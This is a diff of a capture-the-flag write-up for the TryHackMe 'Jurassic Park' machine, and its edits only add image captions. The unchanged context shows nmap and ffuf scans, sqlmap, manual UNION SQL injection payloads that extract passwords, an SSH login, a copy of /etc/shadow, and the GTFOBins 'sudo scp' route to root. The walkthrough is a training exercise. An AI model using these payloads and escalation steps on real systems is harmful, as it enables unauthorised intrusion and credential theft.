@@ -28,7 +28,7 @@ I performed an **nmap** aggressive scan to find open ports, service info and scr
 nmap -A -p- TARGET --min-rate 10000 -oN jurassic.nmap
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/1.webp)
+![performing an nmap scan on the jurassic park machine](https://cdn.ziomsec.com/jurassic-park/1.webp)
 
 The target had only 2 ports open:
 - Port 80 : http
@@ -38,19 +38,19 @@ The target had only 2 ports open:
 
 I accessed the web application through my browser.
 
-![](https://cdn.ziomsec.com/jurassic-park/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/jurassic-park/2.webp)
 
 I clicked on the *online shop* and was given an option to select a package.
 
-![](https://cdn.ziomsec.com/jurassic-park/3.webp)
+![inspecting the web application](https://cdn.ziomsec.com/jurassic-park/3.webp)
 
 I clicked on a package and noticed that the package details were being fetched using the **`id`** parameter. I tried adding a **`'`** to see how the application responded.
 
-![](https://cdn.ziomsec.com/jurassic-park/4.webp)
+![testing for sql injection on the web application](https://cdn.ziomsec.com/jurassic-park/4.webp)
 
 It instantly triggered an error.
 
-![](https://cdn.ziomsec.com/jurassic-park/5.webp)
+![getting an error](https://cdn.ziomsec.com/jurassic-park/5.webp)
 
 Scrolling to the bottom of the page revealed a challenge asking us to try `SqlMap`
 
@@ -60,11 +60,11 @@ I then fuzzed for files in the web application and found *robots.txt* that could
 ffuf -u http://TARGET/FUZZ -w /usr/share/wrodlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/6.webp)
+![discovering hidden files using ffuf](https://cdn.ziomsec.com/jurassic-park/6.webp)
 
 However, there was nothing in it. The only page left to inspect now was the *item.php* where an error was thrown upon sending a **`'`** in the **`id`** parameter. I viewed the source code and found that the target was running **MySQL** database.
 
-![](https://cdn.ziomsec.com/jurassic-park/7.webp)
+![viewing the page source](https://cdn.ziomsec.com/jurassic-park/7.webp)
 
 Since, I was dared to use **sqlmap**, I tried using it. However, it was taking a long time and wasn't giving the expected results.
 
@@ -72,7 +72,7 @@ Since, I was dared to use **sqlmap**, I tried using it. However, it was taking a
 sqlmap -u http://TARGET/item.php?id=1' --dbs --tables --columns --schema --dump-all --dbms=mysql
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/8.webp)
+![using sqlmap](https://cdn.ziomsec.com/jurassic-park/8.webp)
 
 Hence, I switched to manual testing. I captured the request made for the package on **Burp Suite** and sent it to **Repeater**. Since **`'`** was causing an error, I added a true statement directly after the **id** value. 
 
@@ -83,7 +83,7 @@ The payload that I used:
 
 There was a visible change in the response of the web app.
 
-![](https://cdn.ziomsec.com/jurassic-park/9.webp)
+![inspecting sql injection with burp repeater](https://cdn.ziomsec.com/jurassic-park/9.webp)
 
 When I sent a false statement, no results were found.
 
@@ -103,7 +103,7 @@ When I tried sorting the result based on column number 6, I received an error. H
 +ORDER+BY+6
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/10.webp)
+![determining the number of columns](https://cdn.ziomsec.com/jurassic-park/10.webp)
 
 I then used **`UNION`** to find columns that were returned to us on the web page.
 
@@ -111,7 +111,7 @@ I then used **`UNION`** to find columns that were returned to us on the web page
 UNION+SELECT+1,2,3,4,5
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/11.webp)
+![determining the column name](https://cdn.ziomsec.com/jurassic-park/11.webp)
 
 My usual methods did not work and were being blocked so I searched online to see if there was any another way. 
 
@@ -121,7 +121,7 @@ I used the below query to find the name of the current database.
 +UNION+SELECT+1,DATABASE(),3,4,5
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/12.webp)
+![determining the database name](https://cdn.ziomsec.com/jurassic-park/12.webp)
 
 I then used the below query to find the version of the server
 
@@ -129,7 +129,7 @@ I then used the below query to find the version of the server
 +UNION+SELECT+1,version(),3,4,5
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/13.webp)
+![determining the database version](https://cdn.ziomsec.com/jurassic-park/13.webp)
 
 I queried the table name from the current database.
 
@@ -137,7 +137,7 @@ I queried the table name from the current database.
 UNION+SELECT+1,table_name+3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/14.webp)
+![determining the table name](https://cdn.ziomsec.com/jurassic-park/14.webp)
 
 Then I queried the column name for the *users* table.
 
@@ -145,7 +145,7 @@ Then I queried the column name for the *users* table.
 UNION+SELECT+1,column_name,3,4,5+FROM+information_schema.columns+WHERE+table_name="users"+AND+table_schema=database()
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/15.webp)
+![determining column names](https://cdn.ziomsec.com/jurassic-park/15.webp)
 
 I then extracted password from the table.
 
@@ -153,7 +153,7 @@ I then extracted password from the table.
 UNION+SELECT+1,password,3,password,5+FROM+users
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/16.webp)
+![extracting the password](https://cdn.ziomsec.com/jurassic-park/16.webp)
 
 I found a password. The question on **Tryhackme** already provided a username called **Dennis**. I tried the username and password against **ssh** and changed the letter case of the username...
 
@@ -163,7 +163,7 @@ ssh dennis@TARGET
 
 Finally, I captured first flag.
 
-![](https://cdn.ziomsec.com/jurassic-park/17.webp)
+![capturing the first flag](https://cdn.ziomsec.com/jurassic-park/17.webp)
 
 ## Privilege Escalation
 
@@ -173,7 +173,7 @@ I then looked at my **sudo** privileges and found that I was allowed to run **sc
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/18.webp)
+![listing sudo privileges](https://cdn.ziomsec.com/jurassic-park/18.webp)
 
 My directory also contained a *bash_history* file which would contain a log of commands entered on the terminal.
 
@@ -183,7 +183,7 @@ Viewing the *bash_history* file revealed the third flag. I also got a hint of th
 cat .bash_history
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/19.webp)
+![viewing bash history](https://cdn.ziomsec.com/jurassic-park/19.webp)
 
 I also viewed the shadow file but didn't find the root hash.
 
@@ -191,7 +191,7 @@ I also viewed the shadow file but didn't find the root hash.
 scp /etc/shadow dennis@TARGET:/home/dennis/shadow
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/20.webp)
+![viewing the shadow file](https://cdn.ziomsec.com/jurassic-park/20.webp)
 
 I then visited **GTFOBins** and found a way to exploit the **sudo** privileges on **scp**.
 - https://gtfobins.github.io/gtfobins/scp/#sudo
@@ -205,7 +205,7 @@ sudo scp -S $TF x y:
 
 I followed the method shown on the website and spawned a shell as root.
 
-![](https://cdn.ziomsec.com/jurassic-park/21.webp)
+![exploiting the scp command to get root access](https://cdn.ziomsec.com/jurassic-park/21.webp)
 
 I captured the fifth flag from */root* directory.
 
@@ -213,7 +213,7 @@ I captured the fifth flag from */root* directory.
 cat /root/flag5.txt
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/22.webp)
+![capturing the fifth flag](https://cdn.ziomsec.com/jurassic-park/22.webp)
 
 Since, I had root access, I used the **find** command to search for the second flag.
 
@@ -221,7 +221,7 @@ Since, I had root access, I used the **find** command to search for the second f
 find / -type f -iname '*flag*' 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/23.webp)
+![listing all flags on the machine](https://cdn.ziomsec.com/jurassic-park/23.webp)
 
 I also found the location of the second flag inside *ubuntu* user's bash history file.
 
@@ -229,7 +229,7 @@ I also found the location of the second flag inside *ubuntu* user's bash history
 cat /home/ubuntu/.bash_history
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/24.webp)
+![finding info about the second flag](https://cdn.ziomsec.com/jurassic-park/24.webp)
 
 I then captured flag two.
 
@@ -237,7 +237,7 @@ I then captured flag two.
 cat /boot/grub/fonts/flagTwo.txt
 ```
 
-![](https://cdn.ziomsec.com/jurassic-park/25.webp)
+![capturing the second flag](https://cdn.ziomsec.com/jurassic-park/25.webp)
 
 > PS: There is no flag 4.
 
